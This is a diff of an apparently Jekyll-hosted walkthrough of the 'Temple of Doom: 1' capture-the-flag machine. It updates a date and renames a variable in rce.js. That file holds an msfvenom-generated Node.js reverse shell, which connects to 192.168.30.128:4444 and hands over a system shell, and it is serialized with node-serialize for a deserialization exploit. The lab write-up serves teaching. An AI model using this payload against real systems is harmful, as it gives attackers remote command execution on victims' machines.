@@ -1,7 +1,7 @@
 ---
 layout: post
 date: 2018-08-26 18:15:47 +0000
-last_modified_at: 2018-09-03 09:11:07 +0000
+last_modified_at: 2018-10-14 08:43:16 +0000
 title: "Temple of Doom: 1 Walkthrough"
 subtitle: "I'm No Indiana Jones"
 category: Walkthrough
@@ -74,12 +74,12 @@ Incorporate the output from `msfvenom` into `rce.js`. Remember to remove the enc
 <div class="filename"><span>rce.js</span></div>
 
 ```js
-var reverse_shell = {
+var rev = {
 rce:function(){ var require = global.require || global.process.mainModule.constructor._load; if (!require) return; var cmd = (global.process.platform.match(/^win/i)) ? "cmd" : "/bin/sh"; var net = require("net"), cp = require("child_process"), util = require("util"), sh = cp.spawn(cmd, []); var client = this; var counter=0; function StagerRepeat(){ client.socket = net.connect(4444, "192.168.30.128", function() { client.socket.pipe(sh.stdin); if (typeof util.pump === "undefined") { sh.stdout.pipe(client.socket); sh.stderr.pipe(client.socket); } else { util.pump(sh.stdout, client.socket); util.pump(sh.stderr, client.socket); } }); socket.on("error", function(error) { counter++; if(counter<= 10){ setTimeout(function() { StagerRepeat();}, 5*1000); } else process.exit(); }); } StagerRepeat(); },
 };
 
 var serialize = require('node-serialize');
-console.log(serialize.serialize(test));
+console.log(serialize.serialize(rev));
 ```
 
 Run `node rce.js` to get the serialized string output.
